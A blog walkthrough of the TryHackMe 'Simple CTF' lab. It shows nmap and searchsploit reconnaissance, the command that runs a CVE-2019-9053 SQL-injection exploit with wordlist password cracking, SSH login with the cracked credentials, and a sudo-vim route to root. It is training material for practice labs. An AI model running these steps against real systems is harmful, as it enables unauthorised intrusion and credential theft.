---
title: TryHackMe Simple CTF
date: 2021-07-19T22:32:49+05:30
lastmod: 2021-07-19T22:32:49+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/thm.gif
  alt: "cover image"

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - Simple CTF

draft: false
description: TryHackMe Room Simple CTF solved by Animesh Roy. this is a walkthough. read more...

---


|OverView| |
|---|:---:|
|Simple CTF|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/f28ade2b51eb7aeeac91002d41f29c47.png)|
|room| [Simple CTF](https://tryhackme.com/room/easyctf)|
---

## Task 01: Simple CTF

## How many services are running under port 1000?

### recon

* nmap
  
     ```nmap
     sudo nmap -p 0-999 10.10.38.103 -v -oN 1000-port

     Starting Nmap 7.60 ( https://nmap.org ) at 2021-07-19 18:14 BST
     Initiating ARP Ping Scan at 18:14
     Scanning 10.10.38.103 [1 port]
     Completed ARP Ping Scan at 18:14, 0.22s elapsed (1 total hosts)
     Initiating Parallel DNS resolution of 1 host. at 18:14
     Completed Parallel DNS resolution of 1 host. at 18:14, 0.00s elapsed
     Initiating SYN Stealth Scan at 18:14
     Scanning ip-10-10-38-103.eu-west-1.compute.internal (10.10.38.103) [1000 ports]
     Discovered open port 21/tcp on 10.10.38.103
     Discovered open port 80/tcp on 10.10.38.103
     Completed SYN Stealth Scan at 18:14, 10.05s elapsed (1000 total ports)
     Nmap scan report for ip-10-10-38-103.eu-west-1.compute.internal (10.10.38.103)
     Host is up (0.00037s latency).
     Not shown: 998 filtered ports
     PORT   STATE SERVICE
     21/tcp open  ftp
     80/tcp open  http
     2222/tcp open  EtherNetIP-1
     MAC Address: 02:A2:72:52:C3:F7 (Unknown)

     Read data files from: /usr/bin/../share/nmap
     Nmap done: 1 IP address (1 host up) scanned in 10.39 seconds
               Raw packets sent: 2006 (88.248KB) | Rcvd: 10 (424B)
     ```

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## What is running on the higher port?

* Service Scan on port `2222`

     ```bash
     sudo nmap -p 2222 -sC -sV -oN 2222

     Starting Nmap 7.60 ( https://nmap.org ) at 2021-07-19 18:56 BST
     WARNING: No targets were specified, so 0 hosts scanned.
     Nmap done: 0 IP addresses (0 hosts up) scanned in 0.75 seconds
     ```

---

## What's the CVE you're using against the application?

* nmap service enumeration
  
     ```nmap
     sudo nmap -sC -sV -oN nmap/servicescan -p 22,80,2222 10.10.38.103          1 ⨯
     [sudo] password for anir0y: 
     Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-19 23:32 IST
     Nmap scan report for 10.10.38.103
     Host is up (0.15s latency).

     PORT     STATE    SERVICE VERSION
     22/tcp   filtered ssh
     80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
     | http-robots.txt: 2 disallowed entries 
     |_/ /openemr-5_0_1_3 
     |_http-server-header: Apache/2.4.18 (Ubuntu)
     |_http-title: Apache2 Ubuntu Default Page: It works
     2222/tcp open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
     | ssh-hostkey: 
     |   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
     |   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
     |_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 14.38 seconds
     ```

* Good Old go-Buster the URL:

     ![img](https://i.imgur.com/PO17Ilt.png)

* found the dir `/simple`

     ![img](https://i.imgur.com/0tNzgsZ.png)

     > Application is: CMS Made Simple
     >  
     > Version: 2.2.8

* SearchSploit this

     ```bash
     ┌──(anir0y㉿kali)-[~/share/thm/room/easyctf]
     └─$ searchsploit CMS Made Simple | grep '2.2'
     CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                         | php/webapps/26298.txt
     CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                         | php/webapps/26217.html
     CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                      | php/webapps/29272.txt
     CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                            | php/webapps/4810.txt
     CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                  | php/webapps/48779.py
     CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                    | php/webapps/48742.txt
     CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)        | php/webapps/48851.txt
     CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)                     | php/webapps/49793.txt
     CMS Made Simple 2.2.15 - RCE (Authenticated)                                    | php/webapps/49345.txt
     CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authe | php/webapps/49199.txt
     CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                   | php/webapps/44976.py
     CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                   | php/webapps/45793.py
     CMS Made Simple < 2.2.10 - SQL Injection                                        | php/webapps/46635.py                          
     ```

Looking at the searchsploit result we find tons of vulnerabilities. The question asked in the challenge is the CVE number. So searching more against the cms service I bumped across exploit DB and it showed me the CVE number associated with this vulnerability, also when I compared the results with the searchsploit data I decided to go for the SQL injection vulnerability

* exploit DB
  
     [![img](https://i.imgur.com/8NG6I4I.png)](https://www.exploit-db.com/exploits/46635)

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## To what kind of vulnerability is the application vulnerable?

> refer to [Previous Findings](#whats-the-cve-youre-using-against-the-application)

---

## What's the password?

please remember this is `python 2` tool, you might need to install `pip2` in order to install `termcolor` lib. refer to this [post](https://classroom.anir0y.in/post/pip2-install/)

* SQL injection:
  
     ```bash
     #run the exploit
     python CVE-2019-9053.py -u http://10.10.38.103/simple --crack -w /usr/share/wordlists/rockyou.txt
     ```

     ![img](https://i.imgur.com/obx2Pk0.png)

---

## Where can you login with the details obtained?

* SSH into the Box with Found creds:

     - SSH on port 22 is filtered
     ![img](https://i.imgur.com/SRZWeYt.png)

     - Try SSH into other Found Port
     ![img](https://i.imgur.com/J0uHkMU.png)

it worked!!

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## What's the user flag?

*
     ![img](https://i.imgur.com/EunpfmZ.png)

---

## Is there any other user in the home directory? What's its name?

* check `home dir`

     ```bash
          ls /home
          mitch  sunbath
     ```

---

## What can you leverage to spawn a privileged shell?

usually I start with `sudo -l` to verify if the current user have any sudo privs or not.

* run `sudo -l`
  
     ```bash
     $ sudo -l
     User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
     ```

---

## What's the root flag?

* GTFO bins for the found application!

     ![img](https://i.imgur.com/vIOVgJ3.png)


---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
